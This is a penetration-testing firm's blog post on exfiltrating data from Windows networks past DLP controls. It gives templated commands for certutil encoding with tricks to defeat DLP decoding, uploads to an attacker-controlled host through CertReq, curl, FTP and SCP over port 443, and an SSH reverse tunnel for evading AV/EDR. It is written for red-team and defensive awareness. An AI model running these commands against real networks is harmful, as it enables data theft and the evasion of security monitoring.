---
title: Stupid Simple: Windows Data Exfiltration
url: https://redsiege.com/blog/2025/09/stupid-simple-windows-data-exfiltration/
source: Blog – Red Siege Information Security
date: 2025-09-09
fetch_date: 2025-10-02T19:50:32.912252
---

# Stupid Simple: Windows Data Exfiltration

Register Now For On-Demand Training!

[Learn More](https://training.redsiege.com)

[![](https://redsiege.com/wp-content/uploads/2022/01/redsiege-logo-300x73.png)](https://redsiege.com)

* [About us](https://redsiege.com/about-us/)
* [Blog](https://redsiege.com/red-siege-blog/)
* [Tools](https://redsiege.com/tools/)
* [Training](/training)
* [The Wednesday Offensive](https://redsiege.com/event/wednesdayoffensive/)
* [Contact](https://redsiege.com/contact/)

* [About us](https://redsiege.com/about-us/)
* [Blog](https://redsiege.com/red-siege-blog/)
* [Tools](https://redsiege.com/tools/)
* [Training](/training)
* [The Wednesday Offensive](https://redsiege.com/event/wednesdayoffensive/)
* [Contact](https://redsiege.com/contact/)

![](https://redsiege.com/wp-content/themes/red-siege-theme/img/icon-phone.svg) +1 234-249-1337

# Stupid Simple: Windows Data Exfiltration

By Red Siege | September 8, 2025

![](https://redsiege.com/wp-content/uploads/2025/08/STUPID-SIMPLE-WINEX.jpg)

Table of Contents

Toggle

* [Encoding](#Encoding)
* [Uploading](#Uploading)
* [Bonus Tip: SSH Reverse Shell Proxy](#Bonus_Tip_SSH_Reverse_Shell_Proxy)
* [Conclusion](#Conclusion)
* [About Ian Briley, Security Consultant](#About_Ian_Briley_Security_Consultant)

**by Ian Briley**

To get around a DLP (Data Loss Prevention) implementation, you don’t need a fancy C2 setup to exfil your treasures. In fact, it’s incredibly easy using native tools found on almost all Windows systems. In this blog, I’m going to show you a few (shockingly) overlooked native tools that an attacker can use to exfiltrate data out of your network.

Realistically, if an attacker has access to a user account via credentials and/or access via C2, they can simply copy and paste bits of data with little to no issue. However, let’s say a hacker wants to blend in and not risk their foothold with a really large file (like our dummy example file below). There are some very basic ways I’ve found that surprisingly do not raise a ton of alarms.
![](https://redsiege.com/wp-content/uploads/2025/08/stupid1-300x248.png)

#### Encoding

Most DLP appliances “should” catch raw sensitive data crossing the barrier. You might be amazed how simple it is to get around this. The first step is to transform the data in an unexpected way that won’t trigger a DLP alert. The most common tool used is [CertUtil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil), a native Windows binary.
![](https://redsiege.com/wp-content/uploads/2025/08/stupid2-300x77.png)

With CertUtil, we can use this to simply base64 encode any sensitive data :

`certutil -encode <pathOfFile> <pathWhereToSaveFile>`

In the examples below, you can see we encoded our file and got the output as a certificate. Some DLP appliances will attempt to decode any suspected base64 code. I’ve seen some appliances set to try up 1000 decoding cycles before.

![](https://redsiege.com/wp-content/uploads/2025/08/stupid-3-300x58.png)

Encoding Data

![](https://redsiege.com/wp-content/uploads/2025/08/stupid4-300x133.png)

Data Encoded into Certificate

There are several simple ways to break this “recursive functionality” for decoding. Create a small loop to keep re-encoding the base64 string 1001 times (just remember to decode it at the same number of times).

Or, if you really want to get “knuckle dragger-y”, just add a string randomly throughout the base64 encoded blog as shown below. The DLP appliance will most likely not be able to make sense of it. Just remember to remove those strings (Find all, delete) before trying to decode the string. A human would sniff this out fairly quickly, but by the time they become aware of this, we’ve already snuck out the gems.
![](https://redsiege.com/wp-content/uploads/2025/08/stupid5-300x74.png)

#### Uploading

Okay, so we found some way to get the DLP appliance to not trigger on our content. How do we actually move the data? We’re going to do something very unoriginal and copy what people do for C2. We’re (most likely) going to use web or DNS protocols. If you have the ability to download some tooling, there are a ton of fun things you can do with [ICMP packets](https://github.com/Gurpreet06/ICMP-Data-Exfiltration) (famously, this was used for the [Target Breach](https://www.hyas.com/blog/why-we-still-havent-learned-from-the-target-data-breach-a-decade-later).)

CertReq can be used to upload data to our target host via A POST Request.

![](https://redsiege.com/wp-content/uploads/2025/08/stupid6-300x135.png)

CertReq Usage

`CertReq -Post -config <YourWebServer_URL> <PathOfTheTargetFile>`

cURL should surprise no one. We can use options such as `-T` or `--upload-file` to push the contents of a file to a desired location on the web as a POST request.

![](https://redsiege.com/wp-content/uploads/2025/08/stupid7-300x127.png)
`curl -d <PathToFile> <WebHostURL>`
`curl -F <PathToFile> <WebHostURL>`
`curl -X POST --data-binary <PathToFile> <WebHostURL>`

FTP comes natively on most recent versions of Windows 10 and all versions of Windows 11. The process is fairly simple; type in FTP, provide login credentials, and then use `put` to upload the file.
`ftp.exe`
`open <HostnameOrIPAddress>`
`user <Username> <Password>`
`put <PathToLocalFile>`

The really cool thing with FTP is you can tell it to talk to a specific port for an FTP host you control. This is useful if the environment has every outbound port blocked except 443. The magic is configuring your FTP server to listen on port 443. Start the FTP client on your Windows host and use the following command.
`ftp.exe`
`open <HostnameOrIPAddress> 443`
`user <Username> <Password>`
`put <PathToLocalFile>`

![](https://redsiege.com/wp-content/uploads/2025/08/stupid8-300x182.png)

FTP Usage

Finally, this should come as no surprise to anyone – good old fashioned SSH/SCP. Bonus round: we can use SSH natively on Windows to create a reverse SSH tunnel to act as a proxy to tunnel commands from our attacker machine.

![](https://redsiege.com/wp-content/uploads/2025/08/stupid9-300x109.png)

SSH Usage

But first, to simply transfer a file with SCP we use:
`scp -r <PathToLocalFile> <Username@<OurSSHServer>:<DesiredUploadDirectory>`

If we run into a similar issue as with FTP where every egress port was blocked except 443, we can simply use the `-P` argument after configuring our SSH server to listen on port 443 instead of 22.
`scp -r <PathToLocalFile> <Username@<OurSSHServer>:<DesiredUploadDirectory> -P 443`

#### Bonus Tip: SSH Reverse Shell Proxy

There have been a handful of times where I could not bypass AV/EDR systems, all my normal bag of tricks for establishing some form of C2 we’re failing, and then I saw it – SSH. I cannot stress enough how many times this has become handy, and I’ve only ever had one client alert on this, too, over the years.
`ssh.exe <username>@<OurSSHServer> -p 443 -R localhost:8443`

#### Conclusion

These are basic ways to egress data out of a network. But, you’d be shocked that a fairly large number of clients I see do a great job at writing detections for these really edge case scenarios but don’t restrict user access or write detections for reverse SSH tunnels or encoding large chunks of data and pushing that out to a web server. Maybe in a future blog we can go over the process of writing detections for odd user behavior, stay tuned!

---

#### About Ian Briley, Security Consultant

![](https://redsiege.com/wp-content/uploads/2023/05/IAN-RS.jpg)

Ian Briley has over 10 years of experience in information security consisting of The United States Armed Forces, the Healthcare industry, Security Operation Centers, and Security Consulting. Ian is an experienced presenter, trainer, developer, maker, and researcher. Ian enjoys attending local security focused groups and learning more about cloud-based environments and solutions

**Certifications:**
CRTO, GWAPT, eJPT, CySA+, SSCP, SEC+

Related Stories

[View More](/blog/)

## Threat Detection Made Simple...